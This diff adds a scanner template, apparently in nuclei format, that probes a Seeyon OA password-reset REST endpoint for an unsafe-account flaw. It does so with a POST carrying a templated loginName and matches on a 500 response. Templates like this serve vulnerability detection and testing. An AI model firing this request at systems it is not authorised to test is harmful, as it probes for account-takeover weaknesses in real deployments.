@@ -1,0 +1,21 @@
+id: yaml-poc-seeyon-seeyon_oa-unsafe_account-CT-868971
+info:
+  name: Yaml Poc Seeyon Seeyon_Oa Unsafe_Account Ct 868971
+  author: lianjian.chen
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-seeyon-seeyon_oa-unsafe_account-CT-868971'
+  tags: xpoc
+  reference: []
+http:
+- method: POST
+  path:
+  - /seeyon/rest/phoneLogin/phoneCode/resetPassword
+  body: '{"loginName":"{{s1}}"}'
+  headers:
+    Content-Type: application/json
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 500
